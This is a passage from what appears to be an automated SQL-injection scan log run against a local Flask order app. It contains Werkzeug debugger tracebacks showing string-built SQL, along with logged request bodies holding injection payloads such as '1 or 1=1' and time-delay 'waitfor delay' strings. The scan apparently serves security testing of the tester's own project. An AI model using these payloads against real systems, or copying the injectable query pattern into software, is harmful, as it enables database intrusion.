  <ul><li><div class="frame" id="frame-1754718681504">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2213</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>

<li><div class="frame" id="frame-1754718680496">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2193</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-1754718681072">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2190</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-1754718681792">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1486</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
<span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-1754718681360">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1484</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
<span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-1754718680208">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1469</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-1754718681936">
  <h4>File <cite class="filename">"E:\classPro\1204Pro\orderApp\server.py"</cite>,
      line <em class="line">116</em>,
      in <code class="function">create</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>sql = f&#39;update goods set count = {goods_count - request.json[&#34;goods_count&#34;]} where goods_id = %s&#39;</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>info(f&#39;{client_connect}: execute sql &gt;&gt;{sql}&#39;)</pre>
<pre class="line before"><span class="ws">    </span>val = (request.json[&#39;goods_id&#39;],)</pre>
<pre class="line current"><span class="ws">    </span>cursor.execute(sql, val)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">    </span>conn.commit()</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: execute success&#39;)</pre>
<pre class="line after"><span class="ws">    </span># 生成订单 存储订单数据</pre>
<pre class="line after"><span class="ws">    </span>order_id = &#39;OI&#39; + str(int(time.time() * 1000000))</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: order_id &gt;&gt; {order_id}&#39;)</pre></div>
</div>

<li><div class="frame" id="frame-1754718682368">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">691</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>con2.close()</pre>
<pre class="line before"><span class="ws">                    </span>except Exception:</pre>
<pre class="line before"><span class="ws">                        </span>pass</pre>
<pre class="line before"><span class="ws">                </span>if transaction:</pre>
<pre class="line before"><span class="ws">                    </span>self._transaction = False</pre>
<pre class="line current"><span class="ws">                </span>raise error  # re-raise the original error again
<span class="ws">                </span>^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>con._usage += 1</pre>
<pre class="line after"><span class="ws">                </span>return result</pre>
<pre class="line after"><span class="ws">        </span>return tough_method</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754718679056">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">610</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>and not transaction):</pre>
<pre class="line before"><span class="ws">                    </span>raise con._failure</pre>
<pre class="line before"><span class="ws">                </span>if execute:</pre>
<pre class="line before"><span class="ws">                    </span>self._setsizes()</pre>
<pre class="line before"><span class="ws">                </span>method = getattr(self._cursor, name)</pre>
<pre class="line current"><span class="ws">                </span>result = method(*args, **kwargs)  # try to execute
<span class="ws">                </span>         ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">                </span>if execute:</pre>
<pre class="line after"><span class="ws">                    </span>self._clearsizes()</pre>
<pre class="line after"><span class="ws">            </span>except con._failures as error:  # execution error</pre>
<pre class="line after"><span class="ws">                </span>if not transaction:</pre>
<pre class="line after"><span class="ws">                    </span>try:</pre></div>
</div>

<li><div class="frame" id="frame-1754718677904">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">158</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>while self.nextset():</pre>
<pre class="line before"><span class="ws">            </span>pass</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>query = self.mogrify(query, args)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>result = self._query(query)
<span class="ws">        </span>         ^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._executed = query</pre>
<pre class="line after"><span class="ws">        </span>return result</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def executemany(self, query, args):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Run several data against one query.</pre></div>
</div>

<li><div class="frame" id="frame-1754718682944">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">325</em>,
      in <code class="function">_query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rownumber = r</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def _query(self, q):</pre>
<pre class="line before"><span class="ws">        </span>conn = self._get_db()</pre>
<pre class="line before"><span class="ws">        </span>self._clear_result()</pre>
<pre class="line current"><span class="ws">        </span>conn.query(q)
<span class="ws">        </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._do_get_result()</pre>
<pre class="line after"><span class="ws">        </span>return self.rowcount</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _clear_result(self):</pre>
<pre class="line after"><span class="ws">        </span>self.rownumber = 0</pre></div>
</div>

<li><div class="frame" id="frame-1754718679488">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">549</em>,
      in <code class="function">query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span># if DEBUG:</pre>
<pre class="line before"><span class="ws">        </span>#     print(&#34;DEBUG: sending query:&#34;, sql)</pre>
<pre class="line before"><span class="ws">        </span>if isinstance(sql, str):</pre>
<pre class="line before"><span class="ws">            </span>sql = sql.encode(self.encoding, &#34;surrogateescape&#34;)</pre>
<pre class="line before"><span class="ws">        </span>self._execute_command(COMMAND.COM_QUERY, sql)</pre>
<pre class="line current"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)
<span class="ws">        </span>                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def next_result(self, unbuffered=False):</pre>
<pre class="line after"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre></div>
</div>

<li><div class="frame" id="frame-1754718682512">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">779</em>,
      in <code class="function">_read_query_result</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                </span>result.unbuffered_active = False</pre>
<pre class="line before"><span class="ws">                </span>result.connection = None</pre>
<pre class="line before"><span class="ws">                </span>raise</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line before"><span class="ws">            </span>result = MySQLResult(self)</pre>
<pre class="line current"><span class="ws">            </span>result.read()
<span class="ws">            </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._result = result</pre>
<pre class="line after"><span class="ws">        </span>if result.server_status is not None:</pre>
<pre class="line after"><span class="ws">            </span>self.server_status = result.server_status</pre>
<pre class="line after"><span class="ws">        </span>return result.affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754718680640">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">1157</em>,
      in <code class="function">read</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>if self.unbuffered_active:</pre>
<pre class="line before"><span class="ws">            </span>self._finish_unbuffered_query()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def read(self):</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line current"><span class="ws">            </span>first_packet = self.connection._read_packet()
<span class="ws">            </span>               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if first_packet.is_ok_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_ok_packet(first_packet)</pre>
<pre class="line after"><span class="ws">            </span>elif first_packet.is_load_local_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_load_local_packet(first_packet)</pre></div>
</div>

<li><div class="frame" id="frame-1754718678048">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">729</em>,
      in <code class="function">_read_packet</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>packet = packet_type(bytes(buff), self.encoding)</pre>
<pre class="line before"><span class="ws">        </span>if packet.is_error_packet():</pre>
<pre class="line before"><span class="ws">            </span>if self._result is not None and self._result.unbuffered_active is True:</pre>
<pre class="line before"><span class="ws">                </span>self._result.unbuffered_active = False</pre>
<pre class="line current"><span class="ws">            </span>packet.raise_for_error()
<span class="ws">            </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return packet</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _read_bytes(self, num_bytes):</pre>
<pre class="line after"><span class="ws">        </span>self._sock.settimeout(self._read_timeout)</pre>
<pre class="line after"><span class="ws">        </span>while True:</pre></div>
</div>

<li><div class="frame" id="frame-1754718679632">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\protocol.py"</cite>,
      line <em class="line">221</em>,
      in <code class="function">raise_for_error</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rewind()</pre>
<pre class="line before"><span class="ws">        </span>self.advance(1)  # field_count == error (we already know that)</pre>
<pre class="line before"><span class="ws">        </span>errno = self.read_uint16()</pre>
<pre class="line before"><span class="ws">        </span>if DEBUG:</pre>
<pre class="line before"><span class="ws">            </span>print(&#34;errno =&#34;, errno)</pre>
<pre class="line current"><span class="ws">        </span>err.raise_mysql_exception(self._data)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def dump(self):</pre>
<pre class="line after"><span class="ws">        </span>dump_packet(self._data)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719175296">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\err.py"</cite>,
      line <em class="line">143</em>,
      in <code class="function">raise_mysql_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>errno = struct.unpack(&#34;&lt;h&#34;, data[1:3])[0]</pre>
<pre class="line before"><span class="ws">    </span>errval = data[9:].decode(&#34;utf-8&#34;, &#34;replace&#34;)</pre>
<pre class="line before"><span class="ws">    </span>errorclass = error_map.get(errno)</pre>
<pre class="line before"><span class="ws">    </span>if errorclass is None:</pre>
<pre class="line before"><span class="ws">        </span>errorclass = InternalError if errno &lt; 1000 else OperationalError</pre>
<pre class="line current"><span class="ws">    </span>raise errorclass(errno, errval)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>
</ul>
  <blockquote>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 or 1=1\n&#39;&#34;)
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;E:\classPro\1204Pro\orderApp\server.py&#34;, line 116, in create
    cursor.execute(sql, val)
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 691, in tough_method
    raise error  # re-raise the original error again
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 325, in _query
    conn.query(q)
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 779, in _read_query_result
    result.read()
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 729, in _read_packet
    packet.raise_for_error()
  File &#34;D:\python3\Lib\site-packages\pymysql\protocol.py&#34;, line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File &#34;D:\python3\Lib\site-packages\pymysql\err.py&#34;, line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 or 1=1\n&#39;&#34;)
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "D:\python3\Lib\site-packages\flask\app.py", line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\classPro\1204Pro\orderApp\server.py", line 116, in create
    cursor.execute(sql, val)
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 691, in tough_method
    raise error  # re-raise the original error again
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 325, in _query
    conn.query(q)
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 779, in _read_query_result
    result.read()
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 729, in _read_packet
    packet.raise_for_error()
  File "D:\python3\Lib\site-packages\pymysql\protocol.py", line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File "D:\python3\Lib\site-packages\pymysql\err.py", line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, "Truncated incorrect DOUBLE value: '1 or 1=1\n'")


-->

[INFO]00:18:10:066-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "a' waitfor delay '0:0:10'--\n"}}
[INFO]00:18:10:066-caseScan.py:113 >> code: 403
[INFO]00:18:10:067-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:151-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "1 waitfor delay '0:0:10'--\n"}}
[INFO]00:18:10:151-caseScan.py:113 >> code: 500
[INFO]00:18:10:152-caseScan.py:114 >> response: <!doctype html>
<html lang=en>
  <head>
    <title>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 waitfor delay &#39;0:0:10&#39;--\n&#39;&#34;)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "f14cIhWZsCFSqB7Czdcp";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>OperationalError</h1>
<div class="detail">
  <p class="errormsg">pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 waitfor delay &#39;0:0:10&#39;--\n&#39;&#34;)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-1754719176304">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2213</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>

<li><div class="frame" id="frame-1754719176016">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2193</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-1754719175008">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2190</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-1754719174864">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1486</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
<span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
